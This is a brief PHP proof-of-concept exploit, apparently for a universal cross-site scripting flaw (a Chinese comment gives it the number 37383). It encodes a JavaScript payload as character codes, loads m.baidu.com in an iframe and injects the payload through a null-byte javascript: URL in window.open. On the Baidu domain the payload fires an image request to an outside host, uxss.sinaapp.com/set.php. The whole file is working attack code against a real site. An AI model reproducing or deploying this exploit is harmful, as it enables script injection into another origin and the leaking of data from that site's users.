<?php
//漏洞编号 37383
?>
<?php
$code = htmlspecialchars(strip_tags($_GET['code']),ENT_QUOTES);
$str = "if(document.domain == 'm.baidu.com'){new Image().src='http://uxss.sinaapp.com/set.php?code=".$code."&suc=2';}";
//$str = "if(document.domain == 'm.baidu.com'){alert(1)}";

$tmp = str_split($str);
$result = array();

foreach($tmp as $key => $value){
    $result[$key] = ord($value);
}

$input = implode(",", $result);

?>
<script>

</script>
<iframe name="m" id="m"src="http://m.baidu.com" onload="window.open('\u0000javascript:eval(String.fromCharCode(<?php echo $input;?>))','m')" >
 
   